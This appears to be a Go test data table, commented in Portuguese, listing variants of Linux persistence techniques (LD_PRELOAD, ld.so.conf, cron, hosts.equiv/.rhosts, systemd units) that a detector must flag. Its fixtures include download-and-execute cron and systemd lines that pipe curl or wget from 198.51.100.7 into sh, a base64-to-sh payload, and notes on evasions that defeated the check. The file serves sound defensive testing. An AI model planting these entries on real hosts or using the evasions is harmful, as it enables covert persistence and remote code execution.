package variante

// tabela: cada técnica ATT&CK em várias formas.
//
// As FIRE são formas que um atacante escolhe de graça e que o check tem de
// pegar em todas. As BLIND são o mapa honesto: o ponto cego declarado, que o
// teste obriga a promover se um dia fechar.
var tabela = []tecnica{
	{
		attack: "T1574.006", nome: "ld_preload",
		variantes: []variante{
			{nome: "lib em tmp", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "/tmp/.x.so\n"},
				nota:     "o caminho da lib é escolha do atacante"},
			{nome: "lib em usr local", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "/usr/local/lib/libx.so\n"},
				nota:     "diretório de instalação manual não muda o fato: o preload é global"},
			{nome: "com espacos e comentario", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "# comentário\n  /opt/e.so  \n"},
				nota:     "espaço em volta e comentário são ruído, a lib continua ali"},
			{nome: "duas libs", esperaID: "persist.ld_preload_global",
				arquivos: map[string]string{"etc/ld.so.preload": "/a.so\n/b.so\n"},
				nota:     "uma legítima ao lado da maliciosa não esconde a existência do arquivo"},
		},
	},
	{
		attack: "T1574.006", nome: "ld_so_conf",
		variantes: []variante{
			{nome: "diretorio gravavel direto", esperaID: "persist.ld_so_conf_odd",
				arquivos: map[string]string{"etc/ld.so.conf": "/tmp/libs\n"},
				nota:     "diretório de busca de biblioteca gravável por qualquer um"},
			{nome: "via include", esperaID: "persist.ld_so_conf_odd",
				arquivos: map[string]string{
					"etc/ld.so.conf": "include /etc/ld.so.conf.d/*.conf\ninclude /tmp/x.conf\n",
					"tmp/x.conf":     "/tmp/libs\n",
				},
				nota: "o include fora do padrão é o que o coletor tinha de seguir"},
		},
	},
	{
		attack: "T1053.003", nome: "cron_download",
		variantes: []variante{
			{nome: "pipe para sh", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root curl -s http://198.51.100.7/a | sh\n"},
				nota:     "baixa-e-executa clássico"},
			{nome: "pipe para caminho absoluto", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root curl -s http://198.51.100.7/a | /bin/sh\n"},
				nota:     "a evasão que zerava o check: interpretador por caminho absoluto"},
			{nome: "wget com tab", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root wget -qO- http://198.51.100.7/a |\tsh\n"},
				nota:     "TAB no lugar do espaço não muda o que roda"},
			{nome: "reboot com tab", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "@reboot\troot\tcurl -s http://198.51.100.7/a | sh\n"},
				nota:     "@reboot separado por tab: a persistência de boot mais barata"},
			{nome: "base64 decode", esperaID: "persist.cron_suspect",
				arquivos: map[string]string{"etc/cron.d/x": "* * * * * root echo aGk= | base64 -d | sh\n"},
				nota:     "payload ofuscado em base64"},
		},
	},
	{
		attack: "T1021.004", nome: "host_trust",
		variantes: []variante{
			{nome: "hosts.equiv curinga", esperaID: "persist.host_trust",
				arquivos: map[string]string{"etc/hosts.equiv": "+\n"},
				nota:     "o + confia em qualquer host e qualquer usuário: login sem senha de qualquer lugar"},
			{nome: "hosts.equiv com comentario", esperaID: "persist.host_trust",
				arquivos: map[string]string{"etc/hosts.equiv": "# trust\n+\n"},
				nota:     "comentário antes do + não esconde o curinga"},
			{nome: "shosts.equiv nomeado", esperaID: "persist.host_trust",
				arquivos: map[string]string{"etc/shosts.equiv": "buildserver\n"},
				nota:     "host nomeado é raro em sistema moderno: aviso, mas achado"},
			{nome: "rhosts de root", esperaID: "persist.host_trust",
				arquivos: map[string]string{
					"etc/passwd":   "root:x:0:0::/root:/bin/sh\n",
					"root/.rhosts": "outro\n"},
				nota: ".rhosts de usuário: quem entra vira aquela conta sem autenticar"},
		},
	},
	{
		attack: "T1543.002", nome: "unit_download",
		variantes: []variante{
			{nome: "ExecStart pipe sh", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/bin/sh -c \"curl -s http://198.51.100.7/a | sh\"\n"},
				nota: "unit que baixa e executa"},
			{nome: "ExecStart caminho absoluto", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/bin/sh -c \"curl -s http://198.51.100.7/a | /usr/bin/bash\"\n"},
				nota: "mesma evasão da cron, na unit"},
			{nome: "ExecStart em tmpfs", esperaID: "persist.unit_exec_suspect",
				arquivos: map[string]string{
					"etc/systemd/system/x.service": "[Service]\nExecStart=/dev/shm/agent\n"},
				nota: "binário em tmpfs: some no reboot"},
		},
	},
}
